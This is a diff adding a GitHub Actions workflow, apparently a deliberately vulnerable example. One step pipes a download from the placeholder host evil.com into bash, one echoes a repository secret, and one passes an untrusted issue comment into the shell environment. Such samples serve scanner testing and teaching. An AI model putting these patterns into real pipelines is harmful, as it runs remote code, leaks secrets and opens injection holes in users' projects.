@@ -1,0 +1,23 @@
+name: Vulnerable GitHub Actions Example
+
+on: [push]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+    - name: Checkout
+      uses: actions/checkout@v2
+
+    - name: Execute a potentially unsafe script
+      run: |
+        echo "Running a potentially unsafe script..."
+        bash -c "echo ${{ secrets.SECRET_ENV }}"
+        curl -s https://evil.com/brokenlinkexample | bash
+
+    - name: Another insecure step
+      env:
+        DANGEROUS: ${{ github.event.issue.comment.body }}
+      run: |
+        echo "Dangerous data: $DANGEROUS"
+
